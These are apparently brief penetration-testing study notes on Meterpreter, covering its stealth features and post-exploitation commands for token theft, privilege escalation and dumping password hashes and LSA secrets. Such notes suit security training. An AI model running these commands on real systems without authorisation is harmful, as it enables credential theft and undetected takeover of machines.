
DLL injection to ensure connection is stable and difficult to detect. Can be configured for persistence.

meterpreter >

```shell-session
help
```

- Stealthy
- Powerful
- Extensible

- In memory
- Injected into compromised process
- Communication is encrypted with AES
- Modular

Migration
```shell-session
ps
```
```shell-session
steal_token 1836
```

Escalate privileges
```shell-session
bg
```
```shell-session
search local_exploit_suggester
```

Stealing hashes
```shell-session
hashdump
```

```shell-session
lsa_dump_sam
```
```shell-session
lsa_dump_secrets
```

